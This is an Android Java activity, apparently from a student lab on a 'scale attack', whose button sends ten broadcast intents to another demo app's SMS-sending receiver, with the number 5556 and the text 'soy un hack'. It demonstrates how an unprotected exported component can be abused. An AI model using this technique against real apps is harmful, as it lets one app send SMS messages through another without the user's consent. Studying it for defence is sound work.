package com.soa.jnavarro.soascaleattackb;

import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button testButton = (Button) findViewById(R.id.test_button);
        testButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                for (int i =0; i<10;i++){
                    Intent intent = new Intent("com.soa.jnavarro.soascaleattacka.SendMSS");
                    intent.putExtra("numero","5556");
                    intent.putExtra("mensaje","soy un hack");
                    getApplicationContext().sendBroadcast(intent);
                }


            }
        });
    }
}
